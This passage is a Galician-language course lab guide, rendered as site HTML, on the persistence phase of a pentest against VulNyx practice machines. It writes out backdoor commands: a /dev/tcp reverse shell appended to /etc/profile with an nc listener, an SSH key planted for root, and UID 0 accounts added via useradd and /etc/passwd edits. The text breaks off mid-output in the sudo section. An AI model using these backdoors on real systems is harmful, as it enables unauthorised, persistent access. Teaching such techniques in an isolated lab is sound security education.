+  <span class="md-ellipsis">
+    Fase 5. Persistencia. Máquinas virtuais nivel Low, Easy, Medium, so Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 5. Persistencia. Máquinas virtuais nivel Low, Easy, Medium, so Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../indice_vulnyx_low_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Low
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../indice_vulnyx_easy_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Easy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../indice_vulnyx_medium_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Medium
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-windows-persistencia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Máquinas Vulnyx
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Vuln Lab AD-DC
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Vuln Lab AD-DC
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Laboratorio
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Laboratorio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows/vuln-lab-ad/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    README
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows/vuln-lab-ad/1-GUIA_MESTRA_VULN_HE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Guía mestra
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1_3" id="__nav_3_3_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ataques específicos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_3_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Ataques específicos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows/vuln-lab-ad/8-ATAQUE_ESPECIFICO_SILVER_TICKET/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Silver Ticket
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows/vuln-lab-ad/9-ATAQUE_ESPECIFICO_GOLDEN_TICKET/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Golden Ticket
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows/vuln-lab-ad/6-ANALISE_USUARIOS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Análise usuarios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-introducion-e-preparacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Introdución e Preparación
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Introdución e Preparación">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#obxectivo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Obxectivo
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pasos-basicos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pasos básicos
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fases-dun-test-de-intrusion-pentest" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fases dun test de intrusión (Pentest)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-bloque-i-persistencia-en-conexions-e-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Bloque I: Persistencia en Conexións e Shells
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Bloque I: Persistencia en Conexións e Shells">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-1-reverse-shell-simple-etcprofile" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 1: Reverse shell simple (/etc/profile)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-2-clave-ssh-persistente" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 2 - Clave SSH persistente
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-bloque-ii-persistencia-en-usuarios-e-credenciais" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Bloque II: Persistencia en Usuarios e Credenciais
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Bloque II: Persistencia en Usuarios e Credenciais">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-3-engadir-usuario-permanente-e-ademais-facelo-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 3 - Engadir usuario permanente e ademais facelo root
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-4-modificacion-de-arquivo-etcpasswd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 4 - Modificación de arquivo /etc/passwd
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-5-privilexios-sudo-sen-contrasinal-visudo-nopasswd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 5 - Privilexios sudo sen contrasinal (visudo NOPASSWD)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-bloque-iii-automatizacion-e-eventos-triggers" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Bloque III: Automatización e Eventos (Triggers)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Bloque III: Automatización e Eventos (Triggers)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-6-tarefa-programada-cron-job" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 6 - Tarefa programada (Cron Job)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-7-backdoor-en-servizo-systemd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 7 - Backdoor en servizo systemd
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-bloque-iv-persistencia-en-binarios-e-entorno" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Bloque IV: Persistencia en Binarios e Entorno
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Bloque IV: Persistencia en Binarios e Entorno">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-8-modificacion-do-path" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 8 - Modificación do PATH
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-9-biblioteca-compartida-maliciosa-ld_preload-estabilizada" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 9 - Biblioteca compartida maliciosa (LD_PRELOAD) - Estabilizada
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-10-capabilities-en-binarios-metodo-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 10 - Capabilities en binarios (Método Python)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-11-binario-suid-malicioso-wrapper-estatico" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 11 - Binario SUID malicioso (Wrapper Estático)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-12-binario-sgid-malicioso-wrapper-estatico" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 12 - Binario SGID malicioso (Wrapper Estático)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusión
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="fase-5-persistencia-maquinas-vulnyx-low-linux">Fase 5. Persistencia - Máquinas VulNyx Low Linux</h1>
+<p><strong>Nota de seguridade:</strong> Usar exclusivamente en contextos autorizados de pentesting.</p>
+<div class="admonition warning">
+<p class="admonition-title"><strong>Recomendacións</strong></p>
+<ul>
+<li>Non actualizar os paquetes da máquina (podería romper vectores de ataque).</li>
+<li>Traballar sempre nunha rede illada (host-only).</li>
+</ul>
+</div>
+<hr />
+<h2 id="1-introducion-e-preparacion">1. Introdución e Preparación</h2>
+<h3 id="obxectivo">Obxectivo</h3>
+<p>Realizar nun test de intrusión a Fase 5. Persistencia sobre as <a href="../indice_vulnyx_low_linux_fases/" target="_blank">máquinas Vulnyx Low Linux da UD2 de HE</a>.</p>
+<hr />
+<h3 id="pasos-basicos">Pasos básicos</h3>
+<ol>
+<li>Descargar unha máquina(OVA) dende VulNyx, por exemplo: <a href="https://vulnyx.com/vm/Basic" target="_blank">Basic</a><br />
+<img alt="Fig. Card Basic VM" src="../images/vulnyx/basic/showcard-basic-mv-vulnyx.png" width="75%" /></li>
+<li>Comprobar o hash
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$<span class="w"> </span>md5sum<span class="w"> </span>Basic.zip
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>6d2eed28deeb0967d8fa454bfcd95ed5<span class="w">  </span>Basic.zip
+</span></code></pre></div></li>
+<li>
+<p>Descomprimir e importar a OVA en VirtualBox. Asegurarse que na configuración de rede o Adaptador 1 esté en modo <strong>Só anfitrión (Host-only)</strong>  </p>
+<p><img alt="Fig. Configuración en VirtualBox" src="../images/detalles-virtualbox-vulnyx-basic.png" width="75%" /></p>
+</li>
+<li>
+<p>Iniciar a máquina.  </p>
+</li>
+<li>Configurar en VirtualBox unha máquina <strong>Kali Linux</strong> coa rede en modo <strong>Só anfitrión (Host‑only)</strong>.  <br />
+<img alt="Fig. Configuración en VirtualBox" src="../images/detalles-virtualbox-kali-host-only.png" width="75%" /></li>
+<li>Arrancar a máquina Kali Linux:  <ul>
+<li>Identificar a IP (<code>netdiscover</code> ou <code>arp-scan</code> ou <code>nmap</code>) e realizar escaneo con <code>nmap</code>.  </li>
+<li>Detectar vulnerabilidades en servizos como SSH, Apache ou CUPS.  </li>
+<li>Explorar un vector de ataque (CUPS).  </li>
+<li>Establecer persistencia e recoller información do sistema.  </li>
+</ul>
+</li>
+<li>Elaborar un informe final coas evidencias obtidas.</li>
+</ol>
+<hr />
+<h2 id="fases-dun-test-de-intrusion-pentest">Fases dun test de intrusión (Pentest)</h2>
+<p><img alt="Fig. Fases Pentest" src="../images/fases6_white_background.png" width="75%" />  </p>
+<hr />
+<h2 id="2-bloque-i-persistencia-en-conexions-e-shells">2. Bloque I: Persistencia en Conexións e Shells</h2>
+<div class="admonition warning">
+<p class="admonition-title">Prerrequisito</p>
+<p>Realizar o procedemento descrito no documento <a href="../doc-vulnyx-basic/" target="_blank">Basic</a></p>
+</div>
+<h3 id="opcion-1-reverse-shell-simple-etcprofile">Opción 1: Reverse shell simple (/etc/profile)</h3>
+<div class="admonition note">
+<p class="admonition-title">IP da máquina Kali Linux</p>
+<p>No caso de execución deste procedemento a IP da máquina Kali Linux foi <strong>192.168.56.53</strong> e o da máquina víctima foi <strong>192.168.56.74</strong>, pero no voso caso pode variar. Tédeo en conta para o seguimento desta práctica.
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$<span class="w"> </span><span class="o">(</span>ip<span class="w"> </span>-o<span class="w"> </span>-4<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>eth0<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $4}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39;/&#39;</span><span class="w"> </span>-f1<span class="w"> </span><span class="c1">#Sustituír eth0 pola NIC correspondente</span>
+</span></code></pre></div></p>
+</div>
+<p>Dentro da consola de <em>root</em> conseguida con <em>env</em> executar:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.53/4444 0&gt;&amp;1&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/profile
+</span></code></pre></div></p>
+<p>E noutra consola en Kali Linux executar:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<img alt="Fig. Persistencia nc listen 4444" src="../images/vulnyx/Basic/nc-profile-2.png" /></p>
+<p>Agora reiniciar a máquina de vulnyx. Podemos executar o comando <code>/sbin/init 6</code> na consola.  </p>
+<p>Unha vez reiniciada a máquina vulnhub ao iniciar sesión co usuario <code>dimitri</code> o arquivo <code>/etc/profile</code> cargarase e abrirase a <code>reverse shell</code> que temos á espera na Kali Linux:<br />
+<img alt="Fig. Persistencia nc profile" src="../images/vulnyx/Basic/nc-profile.png" /></p>
+<hr />
+<h3 id="opcion-2-clave-ssh-persistente">Opción 2 - Clave SSH persistente</h3>
+<p>Esta técnica establece acceso remoto permanente mediante claves SSH, permitindo conexións directas sen necesidade de explotación adicional.</p>
+<p>Na máquina Kali Linux, xerar un par de claves SSH:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ssh-keygen<span class="w"> </span>-t<span class="w"> </span>rsa<span class="w"> </span>-b<span class="w"> </span><span class="m">4096</span><span class="w"> </span>-f<span class="w"> </span>~/.ssh/vulnyx_persist<span class="w"> </span>-N<span class="w"> </span><span class="s2">&quot;&quot;</span>
+</span></code></pre></div></p>
+<p>Copiar a clave pública xerada:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>cat<span class="w"> </span>~/.ssh/vulnyx_persist.pub
+</span></code></pre></div></p>
+<p>Na máquina comprometida, como <code>root</code>, engadir a clave ao usuario <code>root</code> ou a calquera usuario:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>/root/.ssh
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>chmod<span class="w"> </span><span class="m">700</span><span class="w"> </span>/root/.ssh
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC...&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/root/.ssh/authorized_keys
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>/root/.ssh/authorized_keys
+</span></code></pre></div></p>
+<p>Para un usuario normal con privilexios sudo:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>/home/sysadmin/.ssh
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>chmod<span class="w"> </span><span class="m">700</span><span class="w"> </span>/home/sysadmin/.ssh
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC...&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/home/sysadmin/.ssh/authorized_keys
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>/home/sysadmin/.ssh/authorized_keys
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>chown<span class="w"> </span>-R<span class="w"> </span>sysadmin:sysadmin<span class="w"> </span>/home/sysadmin/.ssh
+</span></code></pre></div></p>
+<p>Asegurarse de que o servizo SSH está habilitado e aceptará conexións con clave:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>systemctl<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>ssh
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>systemctl<span class="w"> </span>start<span class="w"> </span>ssh
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;s/#PubkeyAuthentication yes/PubkeyAuthentication yes/&#39;</span><span class="w"> </span>/etc/ssh/sshd_config
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>systemctl<span class="w"> </span>restart<span class="w"> </span>ssh
+</span></code></pre></div></p>
+<p>Agora, dende Kali Linux, conectar directamente:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>ssh<span class="w"> </span>-i<span class="w"> </span>~/.ssh/vulnyx_persist<span class="w"> </span>root@<span class="o">[</span>IP_máquina_víctima<span class="o">]</span>
+</span></code></pre></div></p>
+<p>Esta técnica proporciona acceso limpo, cifrado e persistente sen necesidade de reverse shells ou tarefas programadas visibles.</p>
+<hr />
+<h2 id="3-bloque-ii-persistencia-en-usuarios-e-credenciais">3. Bloque II: Persistencia en Usuarios e Credenciais</h2>
+<h3 id="opcion-3-engadir-usuario-permanente-e-ademais-facelo-root">Opción 3 - Engadir usuario permanente e ademais facelo root</h3>
+<p>Dentro da consola de <em>root</em> conseguida con <em>env</em> executar:<br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>useradd<span class="w"> </span>-m<span class="w"> </span>pentester<span class="w"> </span>-o<span class="w"> </span>-u<span class="w"> </span><span class="m">0</span><span class="w"> </span>-g<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>passwd<span class="w"> </span>pentester
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;s|!||&#39;</span><span class="w"> </span>/etc/shadow
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>su<span class="w"> </span>-<span class="w"> </span>pentester
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>whoami
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>script<span class="w"> </span>/dev/null<span class="w"> </span>-c<span class="w"> </span>bash
+</span></code></pre></div>
+<img alt="Fig. Novo usuario root" src="../images/vulnyx/Basic/vulnyx-pentester-root.png" /></p>
+<hr />
+<h3 id="opcion-4-modificacion-de-arquivo-etcpasswd">Opción 4 - Modificación de arquivo /etc/passwd</h3>
+<p>Esta técnica crea unha entrada directa no arquivo <code>/etc/passwd</code> cunha conta sen contrasinal ou con hash coñecido, proporcionando acceso root inmediato.</p>
+<p>Na máquina comprometida como <code>root</code>:</p>
+<p><strong>Variante 1:</strong></p>
+<p>Crear un usuario con UID 0 sen contrasinal:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;hacker::0:0:System Admin:/root:/bin/bash&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd
+</span></code></pre></div></p>
+<p>Agora podemos facer login sen contrasinal:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>$<span class="w"> </span>su<span class="w"> </span>-<span class="w"> </span>hacker
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="c1"># whoami</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>root
+</span></code></pre></div></p>
+<p><strong>Variante 2:</strong> </p>
+<p>Modificar un usuario existente que raramente se use:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Buscar usuarios do sistema con UID alto</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;:[0-9]{3,}:&#39;</span><span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-5
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1"># Modificar un usuario existente para darlle privilexios root</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;s/^nobody:x:65534:65534:/nobody:x:0:0:/&#39;</span><span class="w"> </span>/etc/passwd
+</span></code></pre></div></p>
+<p>Agora podemos facer login como <code>nobody</code> con privilexios <code>root</code>:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>$<span class="w"> </span>su<span class="w"> </span>-<span class="w"> </span>nobody
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="c1"># id</span>
+</span></code></pre></div></p>
+<p>Esta técnica require acceso <code>root</code> previo para modificar <code>/etc/passwd</code>, pero proporciona unha backdoor moi directa e persistente. É importante notar que en sistemas modernos con SELinux ou AppArmor habilitado, estas modificacións poden ser detectadas ou bloqueadas.</p>
+<hr />
+<h3 id="opcion-5-privilexios-sudo-sen-contrasinal-visudo-nopasswd">Opción 5 - Privilexios sudo sen contrasinal (visudo NOPASSWD)</h3>
+<p>Esta técnica permite a un usuario executar comandos como <code>root</code> sen necesidade de contrasinal, establecendo persistencia mediante privilexios <code>sudo</code>.</p>
+<div class="admonition warning">
+<p class="admonition-title">Prerrequisito</p>
+<p>Ter instalado o paquete <code>sudo</code>:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>$<span class="w"> </span>dpkg<span class="w"> </span>-l<span class="w"> </span>sudo
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nv">Desired</span><span class="o">=</span>Unknown/Install/Remove/Purge/Hold
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="p">|</span><span class="w"> </span><span class="nv">Status</span><span class="o">=</span>Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="p">|</span>/<span class="w"> </span>Err?<span class="o">=(</span>none<span class="o">)</span>/Reinst-required<span class="w"> </span><span class="o">(</span>Status,Err:<span class="w"> </span><span class="nv">uppercase</span><span class="o">=</span>bad<span class="o">)</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="o">||</span>/<span class="w"> </span>Nome<span class="w">           </span>Versión<span class="w">            </span>Architecture<span class="w"> </span>Descrición
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>+++-<span class="o">==============</span>-<span class="o">==================</span>-<span class="o">============</span>-<span class="o">=======================================================</span>
